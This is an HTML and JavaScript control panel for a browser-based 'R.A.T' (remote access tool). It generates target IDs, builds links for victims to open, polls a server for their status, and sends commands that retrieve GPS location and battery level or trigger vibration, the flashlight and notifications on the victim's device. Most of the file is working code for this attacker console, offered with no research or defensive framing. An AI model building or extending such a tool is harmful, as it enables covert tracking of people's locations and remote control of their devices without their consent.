<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>R.A.T CONTROLLER</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #050505;
      color: #00ffaa;
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    .terminal {
      background: #0a0a0a;
      border: 1px solid #00ffaa44;
      padding: 24px;
      width: 100%;
      max-width: 600px;
      border-radius: 12px;
      box-shadow: 0 0 60px #00ffaa11;
    }
    .header {
      font-family: 'Orbitron', monospace;
      font-size: 18px;
      color: #00ffaa88;
      border-bottom: 1px solid #00ffaa33;
      padding-bottom: 10px;
      margin-bottom: 16px;
      text-align: center;
      letter-spacing: 2px;
    }
    .prompt {
      color: #00ffaa;
    }
    .sub {
      text-align: center;
      font-size: 11px;
      color: #00ffaa44;
      letter-spacing: 3px;
      margin-bottom: 16px;
      border-bottom: 1px dashed #00ffaa22;
      padding-bottom: 12px;
    }
    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 14px;
      background: #0d0d0d;
      border: 1px solid #00ffaa33;
      border-radius: 6px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }
    .status-bar .label {
      font-size: 11px;
      color: #00ffaa66;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .status-bar .value.online {
      color: #00ffaa;
    }
    .status-bar .value.offline {
      color: #ff6666;
    }
    .dot {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #00ffaa;
      animation: pulse-dot 1s ease-in-out infinite;
      margin-right: 6px;
    }
    @keyframes pulse-dot {
      0%,
      100% {
        opacity: 1;
        box-shadow: 0 0 15px #00ffaa;
      }
      50% {
        opacity: .3;
        box-shadow: 0 0 4px #00ffaa;
      }
    }
    .share-section {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }
    .share-section input {
      flex: 2;
      min-width: 140px;
      background: #111;
      border: 1px solid #00ffaa44;
      padding: 12px 14px;
      color: #00ffaa;
      font-family: 'Share Tech Mono', monospace;
      font-size: 14px;
      outline: none;
      border-radius: 6px;
    }
    .share-section button {
      padding: 12px 20px;
      background: transparent;
      border: 1px solid #00ffaa;
      color: #00ffaa;
      font-family: 'Orbitron', monospace;
      font-size: 12px;
      letter-spacing: 2px;
      cursor: pointer;
      border-radius: 6px;
      transition: 0.3s;
    }
    .share-section button:hover {
      background: #00ffaa11;
      box-shadow: 0 0 30px #00ffaa22;
    }
    .share-link {
      font-size: 13px;
      color: #00ffaa66;
      word-break: break-all;
      margin-bottom: 12px;
    }
    .share-link .link {
      color: #00ffaa;
    }
    .panel {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin: 14px 0;
    }
    .btn {
      padding: 16px 8px;
      background: #0d0d0d;
      border: 1px solid #00ffaa33;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.2s;
      color: #00ffaa;
      font-family: 'Orbitron', monospace;
      font-size: 11px;
      letter-spacing: 1.5px;
      text-align: center;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }
    .btn:active {
      transform: scale(0.95);
    }
    .btn .icon {
      display: block;
      font-size: 28px;
      margin-bottom: 4px;
    }
    .btn .desc {
      font-size: 9px;
      color: #00ffaa55;
      margin-top: 2px;
    }
    .log {
      margin-top: 14px;
      padding: 10px 12px;
      background: #0d0d0d;
      border: 1px solid #00ffaa22;
      border-radius: 6px;
      max-height: 120px;
      overflow-y: auto;
      font-size: 11px;
      color: #00ffaa55;
    }
    .log .entry {
      padding: 3px 0;
      border-bottom: 1px solid #00ffaa11;
    }
    .log .entry .time {
      color: #00ffaa33;
      margin-right: 8px;
    }
    .log .entry .ok {
      color: #00ffaa;
    }
    .log .entry .err {
      color: #ff6666;
    }
    .footer {
      margin-top: 16px;
      border-top: 1px solid #00ffaa22;
      padding-top: 12px;
      display: flex;
      justify-content: space-between;
      font-size: 10px;
      color: #00ffaa44;
    }
    .robot-loader {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.93);
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .spinner {
      position: relative;
      width: 120px;
      height: 120px;
    }
    .spinner .ring {
      position: absolute;
      border-radius: 50%;
      border: 3px solid transparent;
      border-top-color: #00ffaa;
      animation: spin 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
    }
    .spinner .ring:nth-child(1) {
      width: 100%;
      height: 100%;
      animation-delay: -.45s;
    }
    .spinner .ring:nth-child(2) {
      width: 76%;
      height: 76%;
      top: 12%;
      left: 12%;
      border-top-color: #00ffaa88;
      animation-delay: -.3s;
    }
    .spinner .ring:nth-child(3) {
      width: 52%;
      height: 52%;
      top: 24%;
      left: 24%;
      border-top-color: #00ffaa44;
      animation-delay: -.15s;
    }
    .spinner .ring:nth-child(4) {
      width: 28%;
      height: 28%;
      top: 36%;
      left: 36%;
      border-top-color: #00ffaa22;
      animation-delay: 0s;
    }
    .spinner .core {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #00ffaa;
      box-shadow: 0 0 40px #00ffaa88;
      animation: pulse-core .8s ease-in-out infinite alternate;
    }
    .spinner .antenna {
      position: absolute;
      top: -20px;
      left: 50%;
      transform: translateX(-50%);
      width: 4px;
      height: 20px;
      background: #00ffaa;
      border-radius: 2px;
      animation: antenna-glow .7s ease-in-out infinite alternate;
    }
    .spinner .antenna::after {
      content: '';
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: #00ffaa;
      box-shadow: 0 0 40px #00ffaa;
      animation: antenna-pulse .7s ease-in-out infinite alternate;
    }
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    @keyframes pulse-core {
      0% {
        box-shadow: 0 0 20px #00ffaa44;
        transform: translate(-50%, -50%) scale(.8);
      }
      100% {
        box-shadow: 0 0 60px #00ffaa88;
        transform: translate(-50%, -50%) scale(1.2);
      }
    }
    @keyframes antenna-glow {
      0% {
        opacity: .5;
      }
      100% {
        opacity: 1;
      }
    }
    @keyframes antenna-pulse {
      0% {
        box-shadow: 0 0 20px #00ffaa;
      }
      100% {
        box-shadow: 0 0 60px #00ffaa88;
      }
    }
    .loader-text {
      color: #00ffaa88;
      font-size: 16px;
      letter-spacing: 3px;
      margin-top: 24px;
      font-family: 'Share Tech Mono', monospace;
    }
  </style>
</head>
<body>
  <div class="terminal">
    <div class="header"><span class="prompt">ROBOT#RAT:~$</span> ./control</div>
    <div class="sub">◈ CONTROLLER PANEL ◈</div>

    <div class="status-bar">
      <span class="label">TARGET</span>
      <span class="value offline" id="targetStatus">OFFLINE</span>
    </div>

    <div class="share-section">
      <input type="text" id="targetIdInput" placeholder="Enter Target ID">
      <button onclick="generateId()">GENERATE</button>
      <button onclick="copyLink()">COPY LINK</button>
    </div>
    <div class="share-link" id="shareLinkDisplay"></div>

    <div class="panel">
      <div class="btn" onclick="sendCommand('flashlight')"><span class="icon">☀</span>FLASHLIGHT</div>
      <div class="btn" onclick="sendCommand('vibrate')"><span class="icon">≡</span>VIBRATE</div>
      <div class="btn" onclick="sendCommand('vibrate_long')"><span class="icon">≡≡</span>VIBRATE LONG</div>
      <div class="btn" onclick="sendCommand('battery')"><span class="icon">⚡</span>BATTERY</div>
      <div class="btn" onclick="sendCommand('wake_lock')"><span class="icon">◐</span>WAKE LOCK</div>
      <div class="btn" onclick="sendCommand('orientation')"><span class="icon">⟳</span>ORIENTATION</div>
      <div class="btn" onclick="sendCommand('location')"><span class="icon">⊙</span>GET LOCATION</div>
      <div class="btn" onclick="sendCommand('notification')"><span class="icon">◈</span>NOTIFICATION</div>
    </div>

    <div class="log" id="log">
      <div class="entry"><span class="time">[SYS]</span> Waiting for target...</div>
    </div>
    <div class="footer"><span>STATUS: ARMED</span><span>LOGIC: BYPASSED</span></div>
  </div>

  <!-- ROBOT LOADER -->
  <div class="robot-loader" id="loader">
    <div class="spinner">
      <div class="ring"></div><div class="ring"></div><div class="ring"></div><div class="ring"></div>
      <div class="core"></div><div class="antenna"></div>
    </div>
    <div class="loader-text" id="loaderText">Executing...</div>
  </div>

  <script>
    const API_URL = window.location.origin + '/api';
    let currentTargetId = '';
    let pollInterval = null;

    function generateId() {
      const id = 'R-' + Math.random().toString(36).substring(2, 8).toUpperCase() +
        Math.random().toString(36).substring(2, 6).toUpperCase();
      document.getElementById('targetIdInput').value = id;
      currentTargetId = id;
      document.getElementById('shareLinkDisplay').innerHTML =
        '◈ LINK: <span class="link">' + window.location.origin + '/target.html?id=' + id + '</span>';
      document.getElementById('targetStatus').textContent = 'WAITING';
      document.getElementById('targetStatus').className = 'value offline';
      addLog('Target ' + id + ' generated. Share link.');
      startPolling();
    }

    function copyLink() {
      const id = document.getElementById('targetIdInput').value.trim();
      if (!id) { alert('Generate a target first.'); return; }
      const link = window.location.origin + '/target.html?id=' + id;
      navigator.clipboard.writeText(link).then(() => alert('Link copied!'))
        .catch(() => {
          const inp = document.createElement('input');
          inp.value = link;
          document.body.appendChild(inp);
          inp.select();
          document.execCommand('copy');
          document.body.removeChild(inp);
          alert('Link copied!');
        });
    }

    function startPolling() {
      if (pollInterval) clearInterval(pollInterval);
      pollInterval = setInterval(() => {
        if (!currentTargetId) return;
        fetch(API_URL + '?action=poll&targetId=' + currentTargetId)
          .then(r => r.json())
          .then(data => {
            if (data.command === null) {
              document.getElementById('targetStatus').textContent = 'ONLINE';
              document.getElementById('targetStatus').className = 'value online';
            }
          })
          .catch(() => {});
      }, 2000);
    }

    function showLoader(text) {
      document.getElementById('loaderText').textContent = text || 'Executing...';
      document.getElementById('loader').style.display = 'flex';
    }

    function hideLoader() {
      document.getElementById('loader').style.display = 'none';
    }

    function sendCommand(command) {
      if (!currentTargetId) { alert('Generate a target first.'); return; }
      addLog('📤 Sending: ' + command);
      showLoader('Sending ' + command.toUpperCase());

      fetch(API_URL + '?action=send&targetId=' + currentTargetId, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: command })
        })
        .then(r => r.json())
        .then(data => {
          if (data.id) {
            addLog('✅ Command queued: ' + command);
            pollResult(data.id);
          } else {
            hideLoader();
            addLog('❌ Failed to queue', 'err');
          }
        })
        .catch(err => {
          hideLoader();
          addLog('❌ Error: ' + err.message, 'err');
        });
    }

    function pollResult(cmdId) {
      let attempts = 0;
      const interval = setInterval(() => {
        attempts++;
        fetch(API_URL + '?action=getResult&targetId=' + currentTargetId + '&cmdId=' + cmdId)
          .then(r => r.json())
          .then(data => {
            if (data.result) {
              clearInterval(interval);
              hideLoader();
              handleResult(data.result);
            }
            if (attempts > 15) {
              clearInterval(interval);
              hideLoader();
              addLog('⏱️ Command timed out', 'err');
            }
          })
          .catch(() => {});
      }, 500);
    }

    function handleResult(result) {
      if (result.battery) {
        addLog('🔋 Battery: ' + result.battery + '%', 'ok');
      }
      if (result.location) {
        const loc = result.location;
        addLog('📍 GPS: ' + loc.lat + ', ' + loc.lng, 'ok');
      }
      if (result.flashlight) {
        addLog('💡 Flashlight: ' + result.flashlight, 'ok');
      }
      if (result.error) {
        addLog('⚠️ ' + result.error, 'err');
      }
    }

    function addLog(msg, type) {
      const log = document.getElementById('log');
      const time = new Date().toLocaleTimeString();
      const entry = document.createElement('div');
      entry.className = 'entry';
      const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : '';
      entry.innerHTML = '<span class="time">[' + time + ']</span> <span class="' + cls + '">' + msg + '</span>';
      log.appendChild(entry);
      log.scrollTop = log.scrollHeight;
      if (log.children.length > 40) log.removeChild(log.children[0]);
    }

    window.onload = generateId;
  </script>
</body>
</html>
